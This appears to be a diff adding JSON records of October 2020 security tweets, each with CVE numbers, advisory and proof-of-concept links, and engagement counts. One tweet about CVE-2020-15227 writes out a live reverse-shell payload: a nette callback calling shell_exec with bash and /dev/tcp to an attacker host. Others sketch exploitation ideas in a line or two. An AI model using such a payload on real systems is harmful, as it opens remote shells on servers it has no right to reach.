+        "https://github.com/0neb1n/CVE-2020-16947"
+    ],
+    "tweetfavorites": 69,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "GitHub - 0neb1n/CVE-2020-16947: PoC of CVE-2020-16947 (Microsoft Outlook RCE vulnerablility) - https://t.co/lxlEQcBBTn",
+    "tweettime": "2020-10-16, 00:55:44",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1316905632587501569",
+    "username": "piedpiper1616"
+}
+{
+    "tweetfavorites": 505,
+    "tweetquotes": 7,
+    "tweetreplies": 5,
+    "tweetretweets": 232,
+    "tweettext": "Please make sure to patch your Windows systems. CVE-2020-16938 is no joke. Hard Drive encryption does break this attack, however, most servers and virtual machines don't have HDD encryption enabled. Patch! #ntdsdit op: @jonasLyk https://t.co/PmEfMIRMKg",
+    "tweettime": "2020-10-15, 20:28:48",
+    "tweeturl": "https://twitter.com/mubix/status/1316838457881300992",
+    "username": "mubix"
+}
+{
+    "expanded_url": [
+        "https://github.com/0neb1n/CVE-2020-16947"
+    ],
+    "tweetfavorites": 366,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 156,
+    "tweettext": "https://t.co/KnBoYPhfcY\nwriteup and poc of cve-2020-16947 (outlook rce vuln)",
+    "tweettime": "2020-10-15, 14:59:53",
+    "tweeturl": "https://twitter.com/0neb1n/status/1316755683065307136",
+    "username": "0neb1n"
+}
+{
+    "expanded_url": [
+        "https://srcincite.io/advisories/src-2020-0022/"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 29,
+    "tweettext": "PoC published for CVE-2020-16952, a post-auth Microsoft SharePoint RCE\n\nhttps://t.co/3P4UaMqt36 https://t.co/v6LUl0I5rx",
+    "tweettime": "2020-10-15, 10:33:49",
+    "tweeturl": "https://twitter.com/campuscodi/status/1316688725800374279",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://github.com/rapid7/metasploit-framework/pull/14265"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 32,
+    "tweettext": "SharePoint admins: PATCH !\nUpcoming Microsoft SharePoint Server-Side Include and ViewState RCE (CVE-2020-16952) exploit in #metasploit\n\n@msftsecurity you can update your advisory\n\nVulnerability found by @steventseeley and module by @wvuuuuuuuuuuuuu \n\nhttps://t.co/MOsRPDSHu6 https://t.co/EOKPqeUfBT",
+    "tweettime": "2020-10-15, 08:47:19",
+    "tweeturl": "https://twitter.com/ddouhine/status/1316661921974833152",
+    "username": "ddouhine"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/hacker-leaks-passwords-for-900-enterprise-vpn-servers/"
+    ],
+    "tweetfavorites": 89,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 56,
+    "tweettext": "@BleepinComputer Barnes &amp; Noble had multiple Pulse Secure VPN servers that went unpatched against CVE-2019-11510 for months. Data from their servers was found in the recent leak (https://t.co/4NtBO5Xps8) as well.",
+    "tweettime": "2020-10-15, 05:01:36",
+    "tweeturl": "https://twitter.com/bad_packets/status/1316605119564193799",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16922"
+    ],
+    "tweetfavorites": 87,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 52,
+    "tweettext": "The #CVE-2020-16922 is a #spoofing #vulnerability we submitted to #Microsoft. When a malicious #JAR or #HTA appended to a #CAT file properly #signed by #Microsoft, the security features to prevent improperly signed files from loading gets bypassed.\n\nhttps://t.co/HSSKidjjjX https://t.co/IxH8YH3ayS",
+    "tweettime": "2020-10-15, 04:12:57",
+    "tweeturl": "https://twitter.com/RedDrip7/status/1316592876881502208",
+    "username": "RedDrip7"
+}
+{
+    "expanded_url": [
+        "https://github.com/corelight/CVE-2020-16898"
+    ],
+    "tweetfavorites": 52,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 22,
+    "tweettext": "Just released a simple Zeek package that nicely detects CVE-2020-16898 AKA \"Bad Neighbor” (Windows TCP/IP Remote Code Execution vuln) https://t.co/QZiuvhPH5k @corelight_inc @ynadji",
+    "tweettime": "2020-10-14, 23:55:14",
+    "tweeturl": "https://twitter.com/benreardon/status/1316528019062710272",
+    "username": "benreardon"
+}
+{
+    "tweetfavorites": 293,
+    "tweetquotes": 2,
+    "tweetreplies": 5,
+    "tweetretweets": 80,
+    "tweettext": "Looking at patch diff of tcpip.sys, it seems \"Ipv6pHandleRouterAdvertisement()\" function which is called by \"Icmpv6ReceiveDatagrams()\" function is guilty for Microsoft Windows ICMPv6 router advertisement RCE vulnerability (CVE-2020-16898): https://t.co/9HLISvpHil",
+    "tweettime": "2020-10-14, 21:52:19",
+    "tweeturl": "https://twitter.com/hosselot/status/1316497085320097792",
+    "username": "hosselot"
+}
+{
+    "tweetfavorites": 71,
+    "tweetquotes": 4,
+    "tweetreplies": 6,
+    "tweetretweets": 13,
+    "tweettext": "Figured out CVE-2020-16898 finally. Definitely a biiiiig caveat to exploitation that nobody is talking about (and I won't mention it at the moment, sorry) https://t.co/7zwdrL1vml",
+    "tweettime": "2020-10-14, 19:29:29",
+    "tweeturl": "https://twitter.com/thracky/status/1316461143754510337",
+    "username": "thracky"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16947"
+    ],
+    "tweetfavorites": 45,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 24,
+    "tweettext": "Microsoft is on fire lately 🔥 \n\nCVE-2020-16947 | Microsoft Outlook Remote Code Execution Vulnerability\n\nhttps://t.co/4I5ZnrNToP",
+    "tweettime": "2020-10-14, 18:20:28",
+    "tweeturl": "https://twitter.com/0xdea/status/1316443774743121920",
+    "username": "0xdea"
+}
+{
+    "expanded_url": [
+        "https://t.zsxq.com/zn2BQZr"
+    ],
+    "tweetfavorites": 260,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 119,
+    "tweettext": "CVE-2020-15227 PHP framework nette callback RCE\n\nPOC: /nette.micro?callback=shell_exec&amp;cmd=bash%20-i%20&gt;&amp;%20/dev/tcp/'+lhost+'/'+lport+'0&gt;&amp;1\n\nhttps://t.co/M4oEFOYZva https://t.co/TH5Iu9lFDP",
+    "tweettime": "2020-10-14, 16:30:52",
+    "tweeturl": "https://twitter.com/chybeta/status/1316416189527068672",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://www.youtube.com/watch?v=TjTAYarKDJQ"
+    ],
+    "tweetfavorites": 49,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 19,
+    "tweettext": "Researchers at Theori have successfully confirmed the CVE-2020-16898 vulnerability, dubbed as Bad Neighbor, by demonstrating a remote crash of Windows with BSOD. Be aware of those packets! We are working to craft an RCE exploit, though it looks tough ;)\n\nhttps://t.co/AfRYs0g4iD",
+    "tweettime": "2020-10-14, 14:50:15",
+    "tweeturl": "https://twitter.com/theori_io/status/1316390869537153025",
+    "username": "theori_io"
+}
+{
+    "expanded_url": [
+        "https://tiger-team-1337.blogspot.com/2020/10/audi-a7-2014-mmi-mishandles-format.html"
+    ],
+    "tweetfavorites": 678,
+    "tweetquotes": 23,
+    "tweetreplies": 14,
+    "tweetretweets": 254,
+    "tweettext": "There was CVE-2020-16142 for Benz and CVE-2017-9212 for BMW. Now I present you, Audi. Because why not 😂 https://t.co/JnkGeTgw9x https://t.co/aQQx6hhh1h",
+    "tweettime": "2020-10-14, 14:09:21",
+    "tweeturl": "https://twitter.com/Kevin2600/status/1316380576593571840",
+    "username": "Kevin2600"
+}
+{
+    "tweetfavorites": 195,
+    "tweetquotes": 9,
+    "tweetreplies": 6,
+    "tweetretweets": 117,
+    "tweettext": "Threat level: very préoccupé\n\nCVE-2020-16947 - Microsoft Outlook RCE Vulnerability” allows attackers to send specially crafted emails that can execute commands when opened in the Microsoft Outlook software. This attack also works when an email is viewed in the preview pane. https://t.co/P9ldLFkosM",
+    "tweettime": "2020-10-14, 08:05:06",
+    "tweeturl": "https://twitter.com/H_Miser/status/1316288911040274437",
+    "username": "H_Miser"
+}
+{
+    "expanded_url": [
+        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor/",
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898"
+    ],
+    "tweetfavorites": 68,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "CVE-2020-16898 | Windows TCP/IP Remote Code Execution Vulnerability\nVulnerability Details:\nhttps://t.co/iAX5FiFajJ\nUpdate:\nhttps://t.co/TKrrUk4iQB https://t.co/j33DMv59eV",
+    "tweettime": "2020-10-14, 03:22:26",
+    "tweeturl": "https://twitter.com/blackorbird/status/1316217774125924352",
+    "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://h0mbre.github.io/RyzenMaster_CVE/"
+    ],
+    "tweetfavorites": 675,
+    "tweetquotes": 14,
+    "tweetreplies": 15,
+    "tweetretweets": 244,
+    "tweettext": "CVE-2020-12928, Privilege Escalation in AMD Ryzen Master Overclocking Utility Driver AMDRyzenMaster.sys exploit proof-of-concept. Thanks to everyone mentioned for the help! https://t.co/rmIXieOOvC",
+    "tweettime": "2020-10-14, 00:18:23",
+    "tweeturl": "https://twitter.com/h0mbre_/status/1316171459446726656",
+    "username": "h0mbre_"
+}
+{
+    "tweetfavorites": 312,
+    "tweetquotes": 26,
+    "tweetreplies": 8,
+    "tweetretweets": 232,
+    "tweettext": "Update your Microsoft software now so your system isn't exploited: CVE-2020-16898 in particular should be patched or mitigated immediately, as vulnerable systems could be compromised remotely.",
+    "tweettime": "2020-10-13, 22:54:26",
+    "tweeturl": "https://twitter.com/US_CYBERCOM/status/1316150332498608128",
+    "username": "US_CYBERCOM"
+}
+{
+    "expanded_url": [
+        "https://www.reddit.com/r/blueteamsec/comments/jal83d/cve202016952_microsoft_sharepoint_server/"
+    ],
+    "tweetfavorites": 291,
+    "tweetquotes": 7,
+    "tweetreplies": 2,
+    "tweetretweets": 132,
+    "tweettext": "CVE-2020-16898 (Windows TCP/IP RCE) is beaten by CVE-2020-16952 (SharePoint post auth file inclusion leading to RCE). CVE-2020-16952 has an exploit out and when combined with password spraying/phishing for creds s a threat right now - https://t.co/IZbbn8aB4o",
+    "tweettime": "2020-10-13, 20:12:25",
+    "tweeturl": "https://twitter.com/ollieatnccgroup/status/1316109559526838275",
+    "username": "ollieatnccgroup"
+}
+{
+    "tweetfavorites": 1096,
+    "tweetquotes": 40,
+    "tweetreplies": 20,
+    "tweetretweets": 483,
+    "tweettext": "CVE-2020-16938 - aka bits please!\nSo...recent update changed the permissions on partitions and volume device objects, granting everybody read access.\nThis means that by opening the device directly you can read the raw data without any privs.\n7zip parses NTFS so super for POC https://t.co/JXBTmcEIxQ",
+    "tweettime": "2020-10-13, 19:53:47",
+    "tweeturl": "https://twitter.com/jonasLyk/status/1316104870987010048",
+    "username": "jonasLyk"
+}
+{
+    "tweetfavorites": 435,
+    "tweetquotes": 6,
+    "tweetreplies": 8,
+    "tweetretweets": 137,
+    "tweettext": "CVE-2020-16938 WRITEUP- aka how I installed an UEFI bootkit from edge sandbox.\nSo- the UEFI partition runs FAT32( No ACL or owner concepts)- so instead access is controlled virtually.\nThing is though- by just requesting MAX for permissions everything is bypassed and you get write https://t.co/qcCZKFU6pg",
+    "tweettime": "2020-10-13, 19:38:35",
+    "tweeturl": "https://twitter.com/jonasLyk/status/1316101042279452673",
+    "username": "jonasLyk"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 20,
+    "tweettext": "\"CVE-2020-16898 | Windows TCP/IP Remote Code Execution Vulnerability\"\n\n\"A remote code execution vulnerability exists when the Windows TCP/IP stack improperly handles ICMPv6 Router Advertisement packets. \"\n\nhttps://t.co/bC1M9eOu2o",
+    "tweettime": "2020-10-13, 19:20:25",
+    "tweeturl": "https://twitter.com/circl_lu/status/1316096472375603202",
+    "username": "circl_lu"
+}
+{
+    "expanded_url": [
+        "https://srcincite.io/advisories/src-2020-0022/",
+        "https://srcincite.io/pocs/cve-2020-16952.py.txt"
+    ],
+    "tweetfavorites": 381,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 209,
+    "tweettext": "Microsoft SharePoint Server DataFormWebPart CreateChildControls Server-Side Include Remote Code Execution Vulnerability\n\nCVE: CVE-2020-16952\nAdvisory: https://t.co/ArJrenuRR5\nTechnical analysis + PoC exploit: https://t.co/sKCiTY1Ver",
+    "tweettime": "2020-10-13, 18:33:20",
+    "tweeturl": "https://twitter.com/steventseeley/status/1316084624553017345",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898"
+    ],
+    "tweetfavorites": 415,
+    "tweetquotes": 25,
+    "tweetreplies": 5,
+    "tweetretweets": 217,
+    "tweettext": "CVE-2020-16898 | Windows TCP/IP Remote Code Execution Vulnerability 😱\n\nhttps://t.co/0r0s1oqTDg",
+    "tweettime": "2020-10-13, 18:25:03",
+    "tweeturl": "https://twitter.com/0xdea/status/1316082539858190341",
+    "username": "0xdea"
+}
+{
+    "tweetfavorites": 52,
+    "tweetquotes": 4,
+    "tweetreplies": 2,
+    "tweetretweets": 21,
+    "tweettext": "Highlight from Patch Tuesday is CVE-2020-16898 / Bad Neighbor\n\nA RCE vulnerability exists when the Windows TCP/IP stack improperly handles ICMPv6 Router Advertisement packets that use Option Type 25 (Recursive DNS Server Option) and a length field value that is even.",
+    "tweettime": "2020-10-13, 18:06:06",
+    "tweeturl": "https://twitter.com/blueteamblog/status/1316077767805599744",
+    "username": "blueteamblog"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/microsoft-october-2020-patch-tuesday-fixes-87-vulnerabilities/"
+    ],
+    "tweetfavorites": 141,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 101,
+    "tweettext": "The Microsoft October Patch Tuesday security updates are out\n\n-This month we have fixes for 87 vulnerabilities\n-21 are RCEs\n-CVE-2020-16898 is probably the worst, an RCE in the Windows TCP/IP stack with a 9.8/10 CVSS score\n\nhttps://t.co/EQUMZedSLF https://t.co/geocZqAhDE",
+    "tweettime": "2020-10-13, 17:29:35",
+    "tweeturl": "https://twitter.com/campuscodi/status/1316068580585340931",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor",
+        "https://github.com/advanced-threat-research/CVE-2020-16898"
+    ],
+    "tweetfavorites": 206,
+    "tweetquotes": 9,
+    "tweetreplies": 3,
+    "tweetretweets": 135,
+    "tweettext": "#BadNeighbor is here! This is what we nicknamed the Microsoft Windows critical and wormable RCE vuln, CVE-2020-16898. McAfee ATR has released brief analysis and a Suricata rule for those unable to patch. \n\nhttps://t.co/XaocOyIv1t\nhttps://t.co/Zo8PEKUEkz\n\n#atr #badneighbor #mcafee",
+    "tweettime": "2020-10-13, 17:09:52",
+    "tweeturl": "https://twitter.com/spovolny/status/1316063618161504256",
+    "username": "spovolny"
+}
+{
+    "tweetfavorites": 54,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 8,
+    "tweettext": "Thanks to the help from @Horgh_rce, we can now confirm that we were able to attribute another Windows LPE exploit to Volodya — CVE-2017-0056. This brings the overall number of exploits we attributed to Volodya to 12. https://t.co/WRVULMLeOo",
+    "tweettime": "2020-10-12, 14:08:16",
+    "tweeturl": "https://twitter.com/EyalItkin/status/1315655528752787457",
+    "username": "EyalItkin"
+}
+{
+    "expanded_url": [
+        "https://unit42.paloaltonetworks.com/cve-2020-14386/"
+    ],
+    "tweetfavorites": 121,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 51,
+    "tweettext": "My @Unit42_Intel blog post about CVE-2020-14386: Privilege Escalation Vulnerability in the Linux kernel\nhttps://t.co/3eFaz2KwqE",
+    "tweettime": "2020-10-10, 19:01:35",
+    "tweeturl": "https://twitter.com/0xorco/status/1315004569810866176",
+    "username": "0xorco"
+}
+{
+    "expanded_url": [
+        "https://unit42.paloaltonetworks.com/cve-2020-14386/",
+        "https://www.openwall.com/lists/oss-security/2020/09/03/3"
+    ],
+    "tweetfavorites": 203,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 98,
+    "tweettext": "CVE-2020-14386: Privilege Escalation Vulnerability in the Linux kernel.\n\nBug described as a \"simple arithmetic security issue\"\n\nWrite-up: https://t.co/3iTUKjNcuh\n\nPOC: https://t.co/9NV9qTy4q5 https://t.co/NQBy4bNwQn",
+    "tweettime": "2020-10-10, 15:59:10",
+    "tweeturl": "https://twitter.com/campuscodi/status/1314958662952157184",
+    "username": "campuscodi"
+}
+{
+    "tweetfavorites": 61,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 32,
+    "tweettext": "New #security advisory 🥳:\n\n\"Unauthenticated Remote Code Execution in OverwolfUpdater\" - CVE-2020-25214 https://t.co/GRk1hgEERn",
+    "tweettime": "2020-10-09, 15:32:21",
+    "tweeturl": "https://twitter.com/niemand_sec/status/1314589526032080898",
+    "username": "niemand_sec"
+}
+{
+    "tweetfavorites": 691,
+    "tweetquotes": 27,
+    "tweetreplies": 11,
+    "tweetretweets": 411,
+    "tweettext": "We’re seeing more activity leveraging the CVE-2020-1472 exploit (ZeroLogon). A new campaign shrewdly poses as software updates that connect to known CHIMBORAZO (TA505) C2 infrastructure. The fake updates lead to UAC bypass and use of wscript.exe to run malicious scripts.",
+    "tweettime": "2020-10-06, 21:54:08",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1313598440719355904",
+    "username": "MsftSecIntel"
+}
+{
+    "expanded_url": [
+        "https://msft.it/6012TamGq"
+    ],
+    "tweetfavorites": 393,
+    "tweetquotes": 32,
+    "tweetreplies": 6,
+    "tweetretweets": 286,
+    "tweettext": "MSTIC has observed activity by the nation-state actor MERCURY using the CVE-2020-1472 exploit (ZeroLogon) in active campaigns over the last 2 weeks. We strongly recommend patching. Microsoft 365 Defender customers can also refer to these detections: https://t.co/ieBj2dox78",
+    "tweettime": "2020-10-05, 22:35:00",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1313246337153077250",
+    "username": "MsftSecIntel"
+}
+{
+    "tweetfavorites": 179,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 53,
+    "tweettext": "Microsoft Visual Studio Code seems to have botched the fix for CVE-2020-16881, a \"remote code execution\" vulnerability regarding \"malicious package.json files\". The patch can be trivially bypassed.  A thread 🧵",
+    "tweettime": "2020-10-02, 22:10:08",
+    "tweeturl": "https://twitter.com/justinsteven/status/1312152915344195584",
+    "username": "justinsteven"
+}
+{
+    "tweetfavorites": 251,
+    "tweetquotes": 9,
+    "tweetreplies": 7,
+    "tweetretweets": 47,
+    "tweettext": "Maybe some of you are wondering where that blog post is regarding CVE-2020-16875? Well, it turns out I managed to bypass the patch.",
+    "tweettime": "2020-10-02, 18:03:29",
+    "tweeturl": "https://twitter.com/steventseeley/status/1312090843814203392",
+    "username": "steventseeley"
+}
+{
+    "tweetfavorites": 196,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 22,
+    "tweettext": "Releasing a blog post detailing CVE-2020-16875 tomorrow morning, make sure your coffee is extra brewed.",
+    "tweettime": "2020-10-01, 19:56:19",
+    "tweeturl": "https://twitter.com/steventseeley/status/1311756852871471111",
+    "username": "steventseeley"
+}
